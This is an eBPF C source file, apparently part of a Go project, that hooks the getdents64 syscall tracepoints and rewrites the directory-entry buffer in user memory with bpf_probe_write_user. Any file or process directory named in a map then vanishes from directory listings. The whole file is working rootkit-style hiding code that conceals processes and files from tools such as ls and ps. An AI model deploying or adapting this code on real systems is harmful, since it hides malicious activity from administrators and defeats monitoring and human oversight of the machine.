// Inspired by https://github.com/Acceis/eBPF-hide-PID — thanks <3
//go:build ignore

#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>


#define MAX_NAME_LEN 100
#define MAX_DIRENTS 5000
#define MAX_HIDDEN 16

typedef struct {
   __u8 name[MAX_NAME_LEN];
   int name_len;
} hidden_entry_t;

typedef struct {
   __u32 bpos;
   __u64 *dirents_buf;
   long buf_size;
   __u16 reclen;
   __u16 reclen_prev;
   bool patch_succeeded;
} dirent_scan_t;

struct {
   __uint(type, BPF_MAP_TYPE_ARRAY);
   __uint(max_entries, MAX_HIDDEN);
   __type(key, u32);
   __type(value, hidden_entry_t);
} hidden_entries SEC(".maps");

struct {
   __uint(type, BPF_MAP_TYPE_HASH);
   __uint(max_entries, 10);
   __type(key, u32);
   __type(value, u64);
} dirent_buf_map SEC(".maps");


static __always_inline int read_dirent_name(__u8 *dst, const char *raw_data) {
   return bpf_probe_read_user_str(dst, MAX_NAME_LEN, raw_data);
}

static __always_inline int read_dirent_reclen(u16 *dst, const unsigned short *raw_data) {
   return bpf_probe_read(dst, sizeof(*dst), raw_data);
}

static __always_inline struct linux_dirent64 *get_dirent_ptr(u64 dirents_buf, int bpos) {
   return (struct linux_dirent64 *)(dirents_buf + bpos);
}

static __always_inline bool is_end_of_buffer(int bpos, long buf_size) {
   return bpos >= buf_size;
}

static __always_inline bool remove_dirent(dirent_scan_t *scan) {
   struct linux_dirent64 *prev = get_dirent_ptr(*scan->dirents_buf, (scan->bpos - scan->reclen_prev));
   u16 new_reclen = scan->reclen + scan->reclen_prev;
   return bpf_probe_write_user(&prev->d_reclen, &new_reclen, sizeof(new_reclen)) == 0;
}



static __always_inline u64 *lookup_dirent_buf(const u64 *pid) {
   return (u64 *)bpf_map_lookup_elem(&dirent_buf_map, pid);
}

typedef struct {
   __u8 *name;
   bool found;
} match_ctx_t;

static __always_inline int match_hidden_entry(u32 i, void *data) {
   match_ctx_t *ctx = data;
   const hidden_entry_t *entry = bpf_map_lookup_elem(&hidden_entries, &i);
   if (!entry || entry->name_len == 0)
      return 0;
   int max_len = entry->name_len < MAX_NAME_LEN ? entry->name_len : MAX_NAME_LEN;
   int j;
   for (j = 0; j < max_len; j++) {
      if (ctx->name[j] != entry->name[j])
         return 0;
   }
   if (j == entry->name_len && j < MAX_NAME_LEN && ctx->name[j] == 0x00) {
      ctx->found = true;
      return 1;
   }
   return 0;
}

static __always_inline int hide_dirent_if_match(u32 _, dirent_scan_t *scan)
{
   if (is_end_of_buffer(scan->bpos, scan->buf_size))
      return 1;

   __u8 name[MAX_NAME_LEN];
   struct linux_dirent64 *dirent = get_dirent_ptr(*scan->dirents_buf, scan->bpos);

   read_dirent_reclen(&scan->reclen, &dirent->d_reclen);
   read_dirent_name(name, dirent->d_name);

   match_ctx_t ctx = {
      .name = name,
      .found = false,
   };
   bpf_loop(MAX_HIDDEN, match_hidden_entry, &ctx, 0);
   if (ctx.found) {
      scan->patch_succeeded = remove_dirent(scan);
   }
   scan->reclen_prev = scan->reclen;
   scan->bpos += scan->reclen;
   return 0;
}

SEC("tp/syscalls/sys_enter_getdents64")
int hook_getdents64_enter(struct trace_event_raw_sys_enter *ctx)
{
   u32 pid = bpf_get_current_pid_tgid() >> 32;
   u64 dirents_buf = ctx->args[1];
   bpf_map_update_elem(&dirent_buf_map, &pid, &dirents_buf, BPF_ANY);
   return 0;
}

SEC("tp/syscalls/sys_exit_getdents64")
int hook_getdents64_exit(struct trace_event_raw_sys_exit *ctx)
{
   u64 pid = bpf_get_current_pid_tgid() >> 32;
   u64 *dirents_buf = lookup_dirent_buf(&pid);
   if (!dirents_buf) {
      return 0;
   }
   dirent_scan_t scan = {
      .bpos = 0,
      .dirents_buf = dirents_buf,
      .buf_size = ctx->ret,
      .reclen = 0,
      .reclen_prev = 0,
      .patch_succeeded = false,
   };
   do {
      scan.patch_succeeded = false;
      scan.bpos = 0;
      scan.reclen_prev = 0;
      bpf_loop(MAX_DIRENTS, hide_dirent_if_match, &scan, 0);
   } while (scan.patch_succeeded);
   bpf_map_delete_elem(&dirent_buf_map, &pid);
   return 0;
}
char LICENSE[] SEC("license") = "GPL";
